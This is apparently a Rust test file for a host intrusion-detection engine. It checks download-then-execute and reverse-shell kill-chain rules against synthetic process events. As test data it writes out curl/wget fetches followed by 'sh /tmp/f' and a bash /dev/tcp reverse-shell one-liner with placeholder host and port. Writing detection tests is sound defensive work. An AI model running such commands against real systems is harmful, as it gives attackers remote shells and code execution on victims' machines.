use crate::*;

fn event(pid: u32, ppid: u32, process: &str, command: &str, ts: i64) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({
        "ts_unix":ts,"event_class":"ProcessExec","pid":pid,"ppid":ppid,
        "uid":0,"process":process,"parent_process":"sh","session_id":1,
        "file_write":false,"container_escape":false,"container_privileged":false,
        "command_line":command
    }))
    .unwrap()
}

#[test]
fn agentfix27_lineage_guard_and_descendant_positive() {
    let mut t = TemporalEngine::with_default_rules();
    t.observe(&event(100, 10, "curl", "curl https://example.test/x", 100));
    assert!(!t
        .observe(&event(200, 20, "sh", "sh", 101))
        .iter()
        .any(|h| h == "phi_download_exec"));
    let hits = t.observe(&event(101, 100, "sh", "sh", 102));
    assert!(hits.iter().any(|h| h == "phi_download_exec"));
    let evidence = t
        .last_evidence()
        .iter()
        .find(|e| e.rule == "phi_download_exec")
        .unwrap();
    assert_eq!(evidence.stages.len(), 2);
    assert_eq!(evidence.stages[0].pid, 100);
    assert_eq!(evidence.stages[1].ppid, 100);
    assert!(
        serde_json::to_value(evidence).unwrap()["stages"][0]["command_line"]
            .as_str()
            .unwrap()
            .contains("https://")
    );
}

#[test]
fn agentfix27_generation_guard() {
    for replace_parent in [false, true] {
        let mut t = TemporalEngine::with_default_rules();
        t.observe(&event(10, 2, "sh", "sh", 99));
        t.observe(&event(100, 10, "curl", "curl https://example.test/x", 100));
        let pid = if replace_parent { 10 } else { 100 };
        t.observe(&event(
            pid,
            if replace_parent { 2 } else { 10 },
            "sleep",
            "sleep 1",
            101,
        ));
        assert!(
            !t.observe(&event(101, 10, "sh", "sh", 102))
                .iter()
                .any(|h| h == "phi_download_exec"),
            "replace parent={replace_parent}"
        );
    }
}

#[test]
fn agentfix27_exited_downloader_preserves_sibling_not_reused_pid() {
    for terminal_pid in [100, 101] {
        let mut t = TemporalEngine::with_default_rules();
        t.observe(&event(
            100,
            10,
            "wget",
            "wget -O /tmp/f https://example.test/x",
            100,
        ));
        let mut exit = event(
            100,
            10,
            "wget",
            "wget -O /tmp/f https://example.test/x",
            101,
        );
        exit.event_class = EventClass::ProcessExit;
        t.observe(&exit);
        let hits = t.observe(&event(terminal_pid, 10, "sh", "sh /tmp/f", 102));
        assert_eq!(
            hits.iter().any(|h| h == "phi_download_exec"),
            terminal_pid != 100
        );
    }
    let mut t = TemporalEngine::with_default_rules();
    let download = event(
        100,
        10,
        "wget",
        "wget -O /tmp/f https://example.test/x",
        100,
    );
    t.observe(&download);
    let mut exit = download.clone();
    exit.event_class = EventClass::ProcessExit;
    exit.ts_unix += 1;
    t.observe(&exit);
    t.observe(&event(100, 10, "sleep", "sleep 1", 102));
    assert!(!t
        .observe(&event(101, 10, "sh", "sh /tmp/f", 103))
        .iter()
        .any(|h| h == "phi_download_exec"));
}

fn reverse_engine() -> Layer4Engine {
    let mut e = Layer4Engine::new(300);
    e.add_template(KillChainTemplate {
        name: "killchain_reverse_shell".into(),
        max_depth: 4,
        max_inter_stage_secs: 10,
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: true,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: false,
            require_container_escape: false,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
    });
    e
}

#[test]
fn agentfix27_l4_requires_current_same_generation_stdio_witness() {
    for scenario in ["missing", "ancestor", "exec_reuse", "expired", "positive"] {
        let mut e = reverse_engine();
        let structural = "bash -i >& /dev/tcp/H/P 0>&1";
        e.observe(&event(
            10,
            2,
            "sh",
            if scenario == "ancestor" {
                structural
            } else {
                "sh"
            },
            99,
        ));
        let mut start = event(
            100,
            10,
            "bash",
            if matches!(scenario, "missing" | "ancestor") {
                "bash health.sh"
            } else {
                structural
            },
            100,
        );
        e.observe(&start);
        if scenario == "exec_reuse" {
            start.command_line = Some("bash health.sh".into());
            start.ts_unix += 1;
            e.observe(&start);
        }
        start.event_class = EventClass::NetworkConnect;
        start.ts_unix = if scenario == "expired" { 120 } else { 102 };
        start.command_line = None;
        start.dst_port = Some(443);
        start.dst_ip = Some("10.10.123.35".into());
        assert_eq!(
            e.observe(&start)
                .iter()
                .any(|h| h == "killchain_reverse_shell"),
            scenario == "positive",
            "{scenario}"
        );
        if scenario == "positive" {
            assert!(e.last_evidence()[0].witnesses.iter().any(
                |w| w.signal == "socket_stdio" && w.command_line.as_deref() == Some(structural)
            ));
        }
    }
}
